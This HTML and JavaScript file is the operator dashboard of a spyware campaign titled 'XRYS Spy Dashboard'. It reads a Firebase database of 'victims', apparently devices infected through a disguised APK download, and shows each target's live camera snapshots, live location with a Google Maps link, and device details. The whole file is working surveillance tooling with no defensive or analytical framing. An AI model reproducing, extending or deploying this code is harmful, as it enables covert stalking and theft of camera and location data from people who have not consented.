<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XRYS Spy Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
</head>
<body class="bg-[#0f172a] text-white h-screen flex overflow-hidden font-sans">

    <!-- Sidebar: Victim List -->
    <div class="w-1/3 bg-gray-900 border-r border-gray-700 h-full overflow-y-auto">
        <div class="p-4 bg-gray-800 border-b border-gray-700 sticky top-0 z-10">
            <h1 class="text-xl font-bold text-red-500">🕵️ Active Targets</h1>
            <p class="text-xs text-gray-400 mt-1" id="onlineCount">0 Devices Connected</p>
        </div>
        <div id="victimList" class="divide-y divide-gray-800">
            <!-- Victims will load here -->
        </div>
    </div>

    <!-- Main Area: Spying Data -->
    <div class="flex-1 flex flex-col h-full relative">
        <div id="welcomeMsg" class="absolute inset-0 flex items-center justify-center text-gray-500 flex-col">
            <svg class="w-24 h-24 mb-4 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path></svg>
            <p>Select a target to view data</p>
        </div>

        <!-- Spying Data Panel -->
        <div id="spyPanel" class="hidden flex-1 p-6 flex flex-col gap-6 overflow-y-auto">
            <h2 class="text-2xl font-bold text-red-400 border-b border-gray-700 pb-2" id="spyTargetId">Target: #0000</h2>
            
            <div class="grid grid-cols-2 gap-6">
                <!-- Camera Feed (Snapshot) -->
                <div class="bg-gray-800 rounded-xl p-4 border border-gray-700 flex flex-col">
                    <h3 class="text-sm font-bold text-gray-400 mb-2 uppercase">Live Camera Feed</h3>
                    <div class="flex-1 bg-black rounded overflow-hidden flex items-center justify-center relative min-h-[250px]">
                        <img id="spyCam" src="" class="w-full h-full object-cover hidden">
                        <p id="camWait" class="absolute text-gray-500 text-sm animate-pulse">Waiting for frame...</p>
                    </div>
                </div>

                <!-- Location Data -->
                <div class="bg-gray-800 rounded-xl p-4 border border-gray-700 flex flex-col">
                    <h3 class="text-sm font-bold text-gray-400 mb-2 uppercase">Live Location</h3>
                    <div class="flex-1 flex flex-col items-center justify-center gap-4">
                        <p id="spyLocation" class="text-xl font-mono text-center">Unknown</p>
                        <a id="spyMapsBtn" href="#" target="_blank" class="bg-blue-600 hover:bg-blue-700 px-6 py-3 rounded-lg font-bold transition w-full text-center">
                            Open in Google Maps
                        </a>
                    </div>
                </div>
            </div>

            <!-- Device Info -->
            <div class="bg-gray-800 rounded-xl p-4 border border-gray-700">
                <h3 class="text-sm font-bold text-gray-400 mb-2 uppercase">Device Info</h3>
                <p id="spyDevice" class="text-sm font-mono text-green-400 break-all"></p>
            </div>
        </div>
    </div>

    <script>
        // Firebase Config
        const firebaseConfig = {
            databaseURL: "https://download-apks-adc2c-default-rtdb.firebaseio.com/"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        let currentSelectedId = null;
        const victimList = document.getElementById('victimList');

        // Listen to Firebase for all victims
        db.ref('victims').on('value', (snapshot) => {
            const data = snapshot.val();
            victimList.innerHTML = '';
            
            if(!data) {
                document.getElementById('onlineCount').innerText = "0 Devices Connected";
                return;
            }

            const ids = Object.keys(data);
            document.getElementById('onlineCount').innerText = ids.length + " Devices Connected";

            ids.forEach(id => {
                const v = data[id];
                
                const div = document.createElement('div');
                div.className = `p-4 cursor-pointer hover:bg-gray-800 transition border-l-4 ${currentSelectedId === id ? 'border-red-500 bg-gray-800' : 'border-transparent'}`;
                div.onclick = () => selectVictim(id, v);
                
                div.innerHTML = `
                    <div class="flex justify-between items-center mb-1">
                        <h3 class="font-bold text-lg text-white">ID: ${id}</h3>
                        <span class="text-xs ${v.camStatus === 'Active' ? 'text-green-400' : 'text-red-400'}">${v.camStatus || 'Unknown'}</span>
                    </div>
                    <p class="text-xs text-gray-400 truncate">${v.location || 'No Location'}</p>
                `;
                victimList.appendChild(div);
            });
        });

        function selectVictim(id, data) {
            currentSelectedId = id;
            
            // Highlight in UI (force refresh by triggering listener logic, or just remove classes)
            const divs = victimList.children;
            for(let i=0; i<divs.length; i++) {
                divs[i].className = "p-4 cursor-pointer hover:bg-gray-800 transition border-l-4 border-transparent";
            }
            // (A small bug: We need to find the specific div, but reloading listener handles it)

            // Show Panel
            document.getElementById('welcomeMsg').classList.add('hidden');
            document.getElementById('spyPanel').classList.remove('hidden');
            
            // Set Data
            document.getElementById('spyTargetId').innerText = "Target: #" + id;
            document.getElementById('spyDevice').innerText = data.device || "Unknown Device";
            
            // Location
            document.getElementById('spyLocation').innerText = data.location || "Not available";
            if(data.mapsLink) {
                document.getElementById('spyMapsBtn').href = data.mapsLink;
                document.getElementById('spyMapsBtn').classList.remove('hidden');
            } else {
                document.getElementById('spyMapsBtn').classList.add('hidden');
            }

            // Subscribe to live updates for this specific victim
            db.ref('victims/' + id).on('value', (snap) => {
                const v = snap.val();
                if(!v) return;
                
                // Update Camera Feed
                if(v.latest_frame) {
                    document.getElementById('spyCam').src = v.latest_frame;
                    document.getElementById('spyCam').classList.remove('hidden');
                    document.getElementById('camWait').classList.add('hidden');
                } else {
                    document.getElementById('spyCam').classList.add('hidden');
                    document.getElementById('camWait').classList.remove('hidden');
                }

                // Update Location if it changed
                if(v.location && v.location !== "Waiting for permission...") {
                    document.getElementById('spyLocation').innerText = v.location;
                    if(v.mapsLink) document.getElementById('spyMapsBtn').href = v.mapsLink;
                }
            });
        }
    </script>
</body>
</html>
